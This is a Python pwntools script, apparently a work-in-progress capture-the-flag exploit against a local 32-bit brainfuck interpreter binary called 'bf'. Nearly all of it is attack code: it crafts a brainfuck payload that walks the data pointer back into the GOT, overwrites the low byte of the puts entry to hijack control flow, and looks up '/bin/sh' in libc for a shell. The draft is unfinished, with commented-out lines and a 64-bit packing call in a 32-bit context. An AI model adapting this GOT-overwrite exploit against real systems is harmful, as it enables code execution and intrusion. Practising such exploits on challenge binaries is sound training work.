from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

# Load executable
exe = ELF("./bf")

# Libc
libc = exe.libc
sh_addr = next(libc.search(b"/bin/sh"))
puts_addr = p32(next(libc.search(b"puts")))

#payload = ",.,.<\nAB\n".encode() # --> should work
payload = ""
payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += ">"  * 3 # go to last char of puts  GOT addr
payload += "," # putchar - for sending the last char
payload += "[" # call to puts()
payload +="\n"
payload += "\x2c" # replace last byte of puts() with \x2c - jump to memset addr
payload +="\n"
#payload += ".+" * 224 # print 4 characters from puts() function
#payload = payload.encode().replace('\\n','\n')
print(payload)

got_check = p64(exe.got['puts']) # the function address in GOT

print(f"got addr: {got_check}, puts: {puts_addr}")

# Start process
conn = process("./bf") # local file
print(conn.recvline()) # receive until newline
print(conn.recvline()) # receive until newline
conn.send(payload.encode())
output = conn.recv()
print(f"Program output: {output}") # receive until newline
#conn.recvuntil(b"result:") # receive until given keyword
#conn.send(b"-,+" + "\n" + "AB")



